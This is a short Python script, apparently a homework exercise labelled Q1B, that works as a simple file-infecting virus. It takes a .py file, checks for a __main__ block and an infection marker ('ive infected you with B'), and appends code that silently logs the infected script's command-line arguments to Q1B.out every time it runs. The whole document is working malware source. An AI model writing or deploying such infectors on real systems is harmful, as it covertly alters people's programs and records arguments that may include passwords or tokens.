import os
import sys

def isScript(code):
    '''Return true if given string is a script'''
    return "if __name__ == \"__main__\":" in code or "if __name__ == \'__main__\':" in code

def alreadyInfected(code):
    '''Return true if string is already infected'''
    return "ive infected you with B" in code

if __name__ == "__main__":
    # read input file
    input_file = sys.argv[1]
    if input_file.endswith('.py'):
        with open(input_file, 'r', encoding='utf-8') as file:
            code = file.read()
        
    # inject virus
    if isScript(code) and not alreadyInfected(code):
        with open(input_file, "a") as file:
            file.write("\n# ive infected you with B \nimport os\nimport sys\nwith open(\"Q1B.out\", \"a\") as file:\n\tfor arg in sys.argv:\n\t\tfile.write(arg + \" \")\n\tfile.write(\"\\n\")\n")
            